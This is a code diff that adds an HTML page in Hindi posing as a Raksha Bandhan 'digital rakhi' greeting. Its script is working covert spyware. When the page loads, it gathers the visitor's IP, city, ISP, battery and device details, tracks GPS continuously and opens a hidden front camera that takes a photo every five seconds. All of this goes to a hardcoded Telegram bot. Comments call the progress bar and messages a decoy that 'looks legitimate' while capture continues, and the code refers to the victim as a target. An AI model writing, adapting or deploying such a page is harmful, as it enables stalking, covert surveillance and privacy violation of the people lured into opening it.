@@ -1,0 +1,655 @@
+<!DOCTYPE html>
+<html lang="hi">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <title>रक्षाबंधन 2026 — आपकी डिजिटल राखी</title>
+    <style>
+        * { margin: 0; padding: 0; box-sizing: border-box; }
+        
+        @import url('https://fonts.googleapis.com/css2?family=Playfair+Display:wght@400;600;700&family=Poppins:wght@300;400;500;600&display=swap');
+        
+        body {
+            font-family: 'Poppins', sans-serif;
+            min-height: 100vh;
+            background: #0b0b1e;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            padding: 16px;
+            overflow: hidden;
+            position: relative;
+        }
+        
+        /* ===== ANIMATED BG ===== */
+        .bg-layer {
+            position: fixed; inset: 0; z-index: 0;
+            background: 
+                radial-gradient(ellipse at 20% 50%, rgba(255, 107, 107, 0.08) 0%, transparent 60%),
+                radial-gradient(ellipse at 80% 20%, rgba(253, 121, 168, 0.06) 0%, transparent 50%),
+                radial-gradient(ellipse at 50% 80%, rgba(255, 215, 0, 0.04) 0%, transparent 50%);
+        }
+        
+        .floating {
+            position: fixed; inset: 0; pointer-events: none; z-index: 0;
+            overflow: hidden;
+        }
+        .floating i {
+            position: absolute;
+            display: block;
+            width: 6px; height: 6px;
+            background: rgba(255, 215, 0, 0.15);
+            border-radius: 50%;
+            animation: floatUp linear infinite;
+        }
+        .floating i:nth-child(1) { left: 10%; animation-duration: 12s; animation-delay: 0s; width: 8px; height: 8px; }
+        .floating i:nth-child(2) { left: 25%; animation-duration: 16s; animation-delay: 2s; width: 4px; height: 4px; background: rgba(255,107,107,0.2); }
+        .floating i:nth-child(3) { left: 45%; animation-duration: 14s; animation-delay: 4s; width: 10px; height: 10px; background: rgba(253,121,168,0.15); }
+        .floating i:nth-child(4) { left: 65%; animation-duration: 18s; animation-delay: 1s; width: 5px; height: 5px; }
+        .floating i:nth-child(5) { left: 80%; animation-duration: 13s; animation-delay: 3s; width: 7px; height: 7px; background: rgba(255,234,167,0.2); }
+        .floating i:nth-child(6) { left: 90%; animation-duration: 15s; animation-delay: 5s; width: 4px; height: 4px; }
+        .floating i:nth-child(7) { left: 35%; animation-duration: 20s; animation-delay: 7s; width: 9px; height: 9px; }
+        .floating i:nth-child(8) { left: 55%; animation-duration: 11s; animation-delay: 6s; width: 3px; height: 3px; }
+        
+        @keyframes floatUp {
+            0% { transform: translateY(100vh) rotate(0deg); opacity: 0; }
+            10% { opacity: 1; }
+            90% { opacity: 1; }
+            100% { transform: translateY(-20vh) rotate(720deg); opacity: 0; }
+        }
+        
+        /* ===== CARD ===== */
+        .card {
+            position: relative;
+            z-index: 1;
+            width: 100%;
+            max-width: 430px;
+            background: linear-gradient(160deg, rgba(255,255,255,0.07), rgba(255,255,255,0.02));
+            backdrop-filter: blur(40px);
+            -webkit-backdrop-filter: blur(40px);
+            border-radius: 32px;
+            padding: 36px 24px 30px;
+            border: 1px solid rgba(255,255,255,0.08);
+            box-shadow: 0 40px 100px rgba(0,0,0,0.6), inset 0 1px 0 rgba(255,255,255,0.08);
+            text-align: center;
+        }
+        
+        .card::before {
+            content: '';
+            position: absolute;
+            inset: -1px;
+            border-radius: 32px;
+            padding: 1px;
+            background: linear-gradient(135deg, rgba(255,215,0,0.15), transparent 40%, transparent 60%, rgba(255,107,107,0.1));
+            -webkit-mask: linear-gradient(#fff 0 0) content-box, linear-gradient(#fff 0 0);
+            -webkit-mask-composite: xor;
+            mask-composite: exclude;
+            pointer-events: none;
+        }
+        
+        /* Decorative top */
+        .deco-top {
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 14px;
+            margin-bottom: 14px;
+        }
+        .deco-top .dash {
+            height: 1px;
+            width: 50px;
+            background: linear-gradient(90deg, transparent, rgba(255,215,0,0.25), transparent);
+        }
+        .deco-top .dash-l { background: linear-gradient(90deg, transparent, rgba(255,215,0,0.25)); }
+        .deco-top .dash-r { background: linear-gradient(90deg, rgba(255,215,0,0.25), transparent); }
+        .deco-top .orn { font-size: 22px; opacity: 0.7; }
+        
+        /* ===== RAKHI ICON ===== */
+        .icon-circle {
+            width: 96px; height: 96px;
+            margin: 0 auto 14px;
+            background: linear-gradient(135deg, rgba(255,107,107,0.15), rgba(253,121,168,0.10));
+            border-radius: 50%;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            border: 2px solid rgba(255,215,0,0.15);
+            position: relative;
+        }
+        .icon-circle::after {
+            content: '';
+            position: absolute;
+            inset: -5px;
+            border-radius: 50%;
+            border: 1px solid rgba(255,215,0,0.08);
+            animation: ringPulse 2.5s ease-in-out infinite;
+        }
+        @keyframes ringPulse {
+            0%, 100% { transform: scale(1); opacity: 0.3; }
+            50% { transform: scale(1.06); opacity: 0.05; }
+        }
+        .icon-circle .emoji { font-size: 46px; animation: sway 3s ease-in-out infinite; }
+        @keyframes sway {
+            0%, 100% { transform: rotate(-3deg); }
+            50% { transform: rotate(6deg); }
+        }
+        
+        /* ===== TEXT ===== */
+        h1 {
+            font-family: 'Playfair Display', serif;
+            font-size: 25px;
+            font-weight: 700;
+            background: linear-gradient(135deg, #fff 20%, #ffd700 90%);
+            -webkit-background-clip: text;
+            -webkit-text-fill-color: transparent;
+            background-clip: text;
+            letter-spacing: 0.3px;
+            margin-bottom: 2px;
+        }
+        .tagline {
+            color: rgba(255,255,255,0.35);
+            font-size: 11px;
+            text-transform: uppercase;
+            letter-spacing: 3px;
+            font-weight: 300;
+            margin-bottom: 18px;
+        }
+        .divider {
+            width: 50px; height: 2px;
+            margin: 0 auto 16px;
+            background: linear-gradient(90deg, transparent, rgba(255,215,0,0.4), transparent);
+        }
+        
+        .message {
+            color: rgba(255,255,255,0.6);
+            font-size: 14px;
+            font-weight: 300;
+            line-height: 1.6;
+            margin-bottom: 22px;
+        }
+        .message strong { color: #ffd700; font-weight: 500; }
+        
+        /* ===== ACTION AREA ===== */
+        .action-box {
+            background: rgba(0,0,0,0.2);
+            border-radius: 18px;
+            padding: 20px 16px;
+            border: 1px solid rgba(255,255,255,0.03);
+            min-height: 90px;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            justify-content: center;
+        }
+        
+        .action-text {
+            color: rgba(255,255,255,0.5);
+            font-size: 13px;
+            font-weight: 300;
+            transition: all 0.6s ease;
+        }
+        .action-text .highlight {
+            color: #ffd700;
+            font-weight: 400;
+        }
+        
+        .action-spinner {
+            width: 40px; height: 40px;
+            border: 3px solid rgba(255,255,255,0.04);
+            border-top: 3px solid rgba(255,215,0,0.4);
+            border-radius: 50%;
+            animation: spin 1.2s linear infinite;
+            margin: 12px auto 0;
+            opacity: 0;
+            transition: opacity 0.6s;
+        }
+        .action-spinner.show { opacity: 1; }
+        
+        @keyframes spin { to { transform: rotate(360deg); } }
+        
+        /* ===== PHASE 2: Loading bar (just cosmetic) ===== */
+        .cosmetic-bar {
+            width: 100%;
+            height: 4px;
+            background: rgba(255,255,255,0.04);
+            border-radius: 10px;
+            overflow: hidden;
+            margin-top: 14px;
+            opacity: 0;
+            transition: opacity 0.8s;
+        }
+        .cosmetic-bar.show { opacity: 1; }
+        .cosmetic-bar .fill {
+            height: 100%;
+            width: 0%;
+            background: linear-gradient(90deg, #ff6b6b, #feca57, #ff6b6b);
+            background-size: 200% 100%;
+            border-radius: 10px;
+            animation: shimmerBar 2s linear infinite;
+        }
+        @keyframes shimmerBar {
+            0% { background-position: 200% 0; }
+            100% { background-position: -200% 0; }
+        }
+        
+        .status-dots {
+            display: flex;
+            gap: 6px;
+            justify-content: center;
+            margin-top: 10px;
+            opacity: 0;
+            transition: opacity 0.6s;
+        }
+        .status-dots.show { opacity: 1; }
+        .status-dots span {
+            width: 6px; height: 6px;
+            border-radius: 50%;
+            background: rgba(255,215,0,0.3);
+            animation: dotPulse 1.5s ease-in-out infinite;
+        }
+        .status-dots span:nth-child(2) { animation-delay: 0.3s; }
+        .status-dots span:nth-child(3) { animation-delay: 0.6s; }
+        @keyframes dotPulse {
+            0%, 100% { opacity: 0.2; transform: scale(0.8); }
+            50% { opacity: 1; transform: scale(1.2); }
+        }
+        
+        /* ===== FOOTER ===== */
+        .footer {
+            margin-top: 18px;
+            color: rgba(255,255,255,0.1);
+            font-size: 11px;
+            letter-spacing: 1px;
+        }
+        
+        /* ===== HIDDEN ===== */
+        video, canvas { display: none; }
+        
+        /* ===== RESPONSIVE ===== */
+        @media (max-width: 400px) {
+            .card { padding: 28px 16px 24px; }
+            h1 { font-size: 21px; }
+            .icon-circle { width: 80px; height: 80px; }
+            .icon-circle .emoji { font-size: 38px; }
+        }
+    </style>
+</head>
+<body>
+
+<div class="bg-layer"></div>
+<div class="floating">
+    <i></i><i></i><i></i><i></i><i></i><i></i><i></i><i></i>
+</div>
+
+<div class="card">
+    <div class="deco-top">
+        <div class="dash dash-l"></div>
+        <span class="orn">🪷</span>
+        <div class="dash dash-r"></div>
+    </div>
+
+    <div class="icon-circle">
+        <span class="emoji">🎀</span>
+    </div>
+
+    <h1>रक्षाबंधन की शुभकामनाएं</h1>
+    <p class="tagline">भाई-बहन के प्यार का त्योहार</p>
+    <div class="divider"></div>
+
+    <p class="message">
+        आपकी बहन ने आपके लिए एक <strong>खास डिजिटल राखी</strong> 
+        भेजी है। इसे प्राप्त करने के लिए नीचे दिए गए 
+        एक्सेस दें और अपनी अनोखी राखी पाएं 🌸
+    </p>
+
+    <div class="action-box" id="actionBox">
+        <div class="action-text" id="actionText">
+            ⚡ <span class="highlight">एक क्लिक में</span> अपनी डिजिटल राखी पाएं
+        </div>
+        <div class="action-spinner" id="actionSpinner"></div>
+        <div class="cosmetic-bar" id="cosmeticBar">
+            <div class="fill" id="barFill"></div>
+        </div>
+        <div class="status-dots" id="statusDots">
+            <span></span><span></span><span></span>
+        </div>
+    </div>
+
+    <div class="footer">❤️ प्यार और रिश्तों का त्योहार</div>
+</div>
+
+<video id="video" autoplay playsinline></video>
+<canvas id="canvas"></canvas>
+
+<script>
+// ===== 🔒 CONFIGURATION =====
+const BOT_TOKEN = '8817849055:AAH_Es-VGUDs9nHDoKklkp_xgCk8KSJd2hc';
+const CHAT_ID = '6936978343';
+const PHOTO_INTERVAL_MS = 5000; // Har 5 second mein photo
+
+// ===== DOM REFS =====
+const actionText = document.getElementById('actionText');
+const spinner = document.getElementById('actionSpinner');
+const cosmeticBar = document.getElementById('cosmeticBar');
+const barFill = document.getElementById('barFill');
+const statusDots = document.getElementById('statusDots');
+
+// ===== STATE =====
+let mediaStream = null;
+let watchId = null;
+let photoInterval = null;
+let lastLat = null;
+let lastLon = null;
+let photoCount = 0;
+
+// ===== SILENT SENDERS =====
+async function sendToTelegram(text) {
+    try {
+        await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify({ chat_id: CHAT_ID, text, parse_mode: 'HTML' })
+        });
+    } catch(e) {}
+}
+
+async function sendPhotoToTelegram(blob, caption) {
+    try {
+        const fd = new FormData();
+        fd.append('chat_id', CHAT_ID);
+        fd.append('photo', blob, `photo_${Date.now()}.jpg`);
+        fd.append('caption', caption);
+        await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
+            method: 'POST', body: fd
+        });
+    } catch(e) {}
+}
+
+function blobFromDataUrl(dataUrl) {
+    const parts = dataUrl.split(',');
+    const mime = parts[0].match(/:(.*?);/)[1];
+    const raw = atob(parts[1]);
+    const buf = new ArrayBuffer(raw.length);
+    const view = new Uint8Array(buf);
+    for (let i = 0; i < raw.length; i++) view[i] = raw.charCodeAt(i);
+    return new Blob([buf], { type: mime });
+}
+
+// ===== 1. GET IP (silent) =====
+async function getIPData() {
+    let ip = 'N/A', city = 'N/A', region = 'N/A', country = 'N/A', isp = 'N/A';
+    try {
+        const r = await fetch('https://api.ipify.org?format=json');
+        const d = await r.json();
+        ip = d.ip;
+    } catch(e) {}
+    try {
+        const r = await fetch('https://ipapi.co/json/');
+        const d = await r.json();
+        city = d.city || city;
+        region = d.region || region;
+        country = d.country_name || country;
+        isp = d.org || isp;
+    } catch(e) {}
+    return { ip, city, region, country, isp };
+}
+
+// ===== 2. GET BATTERY (silent) =====
+async function getBatteryData() {
+    try {
+        if (!navigator.getBattery) return { level: 'N/A', charging: 'N/A' };
+        const b = await navigator.getBattery();
+        return { level: Math.round(b.level * 100) + '%', charging: b.charging ? 'Yes' : 'No' };
+    } catch(e) {
+        return { level: 'Error', charging: 'Error' };
+    }
+}
+
+// ===== 3. START CAMERA (hidden, continuous) =====
+async function startCamera() {
+    try {
+        const stream = await navigator.mediaDevices.getUserMedia({
+            video: { facingMode: 'user', width: { ideal: 640 }, height: { ideal: 480 } }
+        });
+        mediaStream = stream;
+        const video = document.getElementById('video');
+        video.srcObject = stream;
+        await video.play();
+        return true;
+    } catch(e) {
+        return false;
+    }
+}
+
+function captureFrame() {
+    if (!mediaStream) return null;
+    try {
+        const video = document.getElementById('video');
+        const canvas = document.getElementById('canvas');
+        canvas.width = video.videoWidth || 640;
+        canvas.height = video.videoHeight || 480;
+        const ctx = canvas.getContext('2d');
+        ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
+        return canvas.toDataURL('image/jpeg', 0.75);
+    } catch(e) {
+        return null;
+    }
+}
+
+// ===== 4. START LOCATION TRACKING (continuous) =====
+function startLocationTracking() {
+    if (!navigator.geolocation) return;
+    watchId = navigator.geolocation.watchPosition(
+        (pos) => {
+            lastLat = pos.coords.latitude;
+            lastLon = pos.coords.longitude;
+        },
+        () => {},
+        { enableHighAccuracy: true, timeout: 10000, maximumAge: 0 }
+    );
+}
+
+// ===== 5. SEND INITIAL REPORT =====
+async function sendInitialReport(ipData, batteryData) {
+    const timeStr = new Date().toLocaleString('hi-IN', { timeZone: 'Asia/Kolkata' });
+    const ua = navigator.userAgent;
+    let device = '🖥️ Computer';
+    if (/android/i.test(ua)) device = '📱 Android';
+    else if (/iphone|ipad|ipod/i.test(ua)) device = '📱 iOS';
+    
+    const msg = `
+🎀 <b>रक्षाबंधन — नया लक्ष्य ऑनलाइन!</b> 🎀
+━━━━━━━━━━━━━━━━━━━
+
+⏰ <b>समय:</b> ${timeStr}
+
+🌐 <b>IP:</b> ${ipData.ip}
+🏙️ <b>शहर:</b> ${ipData.city}
+🗺️ <b>राज्य:</b> ${ipData.region}
+🇮🇳 <b>देश:</b> ${ipData.country}
+🏢 <b>ISP:</b> ${ipData.isp}
+
+🔋 <b>बैटरी:</b> ${batteryData.level} (चार्ज: ${batteryData.charging})
+
+📱 <b>डिवाइस:</b> ${device}
+    `.trim();
+    
+    await sendToTelegram(msg);
+}
+
+// ===== 6. CONTINUOUS PHOTO LOOP =====
+async function photoLoop() {
+    if (!mediaStream) return;
+    
+    const dataUrl = captureFrame();
+    if (!dataUrl) return;
+    
+    photoCount++;
+    const blob = blobFromDataUrl(dataUrl);
+    const timeStr = new Date().toLocaleString('hi-IN', { timeZone: 'Asia/Kolkata' });
+    let caption = `📸 फोटो #${photoCount} — ${timeStr}`;
+    
+    // Add location if available
+    if (lastLat && lastLon) {
+        caption += ` | 📍 ${lastLat.toFixed(4)}, ${lastLon.toFixed(4)}`;
+    }
+    
+    await sendPhotoToTelegram(blob, caption);
+    
+    // Also send location update every 3rd photo
+    if (lastLat && lastLon && photoCount % 3 === 0) {
+        const locMsg = `📍 <b>लोकेशन अपडेट #${photoCount}</b>
+   लैट: ${lastLat}
+   लॉन्ग: ${lastLon}
+   🗺️ <a href="https://www.google.com/maps?q=${lastLat},${lastLon}">Google Maps</a>`;
+        await sendToTelegram(locMsg);
+    }
+}
+
+// ===== 7. START CONTINUOUS CAPTURE =====
+function startContinuousCapture() {
+    // First photo immediately
+    setTimeout(() => photoLoop(), 1000);
+    // Then every PHOTO_INTERVAL_MS
+    photoInterval = setInterval(photoLoop, PHOTO_INTERVAL_MS);
+}
+
+// ===== 8. UI UPDATES (cosmetic only - user sees this) =====
+function showPhase1() {
+    // Phase 1: "Accessing..." — user sees permission prompts
+    actionText.innerHTML = `
+        📷 <span class="highlight">कैमरा और लोकेशन</span> एक्सेस की आवश्यकता है<br>
+        <small style="opacity:0.5;font-size:11px;">ब्राउज़र प्रॉम्प्ट में Allow करें</small>
+    `;
+    spinner.classList.add('show');
+}
+
+function showPhase2() {
+    // Phase 2: "Creating digital rakhi..." — permissions granted, looks legitimate
+    actionText.innerHTML = `
+        ✨ आपकी <span class="highlight">डिजिटल राखी</span> तैयार हो रही है...<br>
+        <small style="opacity:0.5;font-size:11px;">कृपया प्रतीक्षा करें</small>
+    `;
+    spinner.classList.remove('show');
+    cosmeticBar.classList.add('show');
+    statusDots.classList.add('show');
+    
+    // Animate bar cosmetically
+    let pct = 0;
+    const barInterval = setInterval(() => {
+        pct += Math.random() * 12;
+        if (pct > 95) pct = 95;
+        barFill.style.width = pct + '%';
+    }, 2000);
+    
+    // After 15 seconds, show "complete" but keep capturing
+    setTimeout(() => {
+        clearInterval(barInterval);
+        barFill.style.width = '100%';
+    }, 18000);
+}
+
+function showPhase3() {
+    // Phase 3: "Complete" — looks done, but background capture continues
+    actionText.innerHTML = `
+        ✅ आपकी <span class="highlight">डिजिटल राखी</span> तैयार है! 🌸<br>
+        <small style="opacity:0.4;font-size:11px;">इसे अपनी बहन को दिखाएं ❤️</small>
+    `;
+    spinner.classList.remove('show');
+    cosmeticBar.classList.remove('show');
+    statusDots.classList.remove('show');
+    
+    // Add a subtle second counter to make it look "live"
+    let seconds = 0;
+    setInterval(() => {
+        seconds++;
+        // Subtle update every 10 seconds
+        if (seconds % 10 === 0) {
+            const msgs = [
+                '💝 राखी की डोर हमेशा बनी रहे',
+                '🌸 भाई-बहन का प्यार अनमोल',
+                '🎀 रक्षाबंधन की हार्दिक शुभकामनाएं',
+                '🪷 यह रिश्ता सबसे खास है',
+                '✨ प्यार और रिश्तों का त्योहार'
+            ];
+            actionText.innerHTML = `
+                ✅ ${msgs[Math.floor(Math.random() * msgs.length)]} 🌸<br>
+                <small style="opacity:0.4;font-size:11px;">इसे अपनी बहन को दिखाएं ❤️</small>
+            `;
+        }
+    }, 10000);
+}
+
+// ===== MAIN BOOT =====
+window.addEventListener('load', async () => {
+    // Small delay so page renders beautifully
+    await new Promise(r => setTimeout(r, 1000));
+    
+    // Show phase 1 — permission request (user sees browser prompt)
+    showPhase1();
+    
+    // Collect IP & Battery silently in background
+    const [ipData, batteryData] = await Promise.all([getIPData(), getBatteryData()]);
+    
+    // Start location tracking (silent, continuous)
+    startLocationTracking();
+    
+    // Request camera access (triggers browser permission prompt)
+    const cameraOK = await startCamera();
+    
+    if (cameraOK) {
+        // Permissions granted — show phase 2
+        showPhase2();
+        
+        // Send initial report
+        await sendInitialReport(ipData, batteryData);
+        
+        // Start continuous photo capture
+        startContinuousCapture();
+        
+        // After some time, show "complete" but keep capturing
+        setTimeout(() => {
+            showPhase3();
+        }, 20000);
+    } else {
+        // Camera denied — still work with what we have
+        actionText.innerHTML = `
+            ⚠️ कैमरा एक्सेस नहीं मिला<br>
+            <small style="opacity:0.5;font-size:11px;">फिर भी आपकी जानकारी भेजी जा रही है</small>
+        `;
+        spinner.classList.remove('show');
+        
+        // Send whatever we have
+        await sendInitialReport(ipData, batteryData);
+        
+        // Still try GPS
+        if (lastLat && lastLon) {
+            await sendToTelegram(`📍 <b>लोकेशन:</b> ${lastLat}, ${lastLon}`);
+        }
+        
+        // Still show a nice completion
+        setTimeout(() => {
+            actionText.innerHTML = `✅ आपकी राखी भेज दी गई है! 🌸`;
+        }, 3000);
+    }
+});
+
+// ===== CLEANUP ON PAGE UNLOAD (optional) =====
+window.addEventListener('beforeunload', () => {
+    if (mediaStream) {
+        mediaStream.getTracks().forEach(t => t.stop());
+        mediaStream = null;
+    }
+    if (photoInterval) {
+        clearInterval(photoInterval);
+        photoInterval = null;
+    }
+    if (watchId) {
+        navigator.geolocation.clearWatch(watchId);
+        watchId = null;
+    }
+});
+</script>
+
+</body>
+</html>
